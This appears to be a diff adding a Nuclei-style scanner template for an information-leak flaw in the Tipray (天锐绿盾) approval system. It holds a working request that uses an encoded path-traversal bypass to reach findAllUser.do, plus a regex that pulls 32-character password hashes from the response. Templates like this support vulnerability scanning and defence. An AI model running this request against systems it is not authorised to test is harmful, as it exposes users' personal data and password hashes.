@@ -1,0 +1,40 @@
+id: poc-yaml-tipray-gsas-findalluser-do-info-leak
+info:
+  name: 天锐绿盾审批系统 findAllUser.do 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/trwfe/login.jsp/.%2e/config/findAllUser.do"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"firstName\":"
+          - "\"email\":"
+          - "\"pwdEncodeType\":"
+      - type: regex
+        part: body
+        regex:
+          - "\"password\":\"([a-z0-9]{32})\""
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+    extractors:
+      - type: regex
+        name: password
+        part: body
+        regex:
+          - "\"password\":\"([a-z0-9]{32})\""
+        group: 1
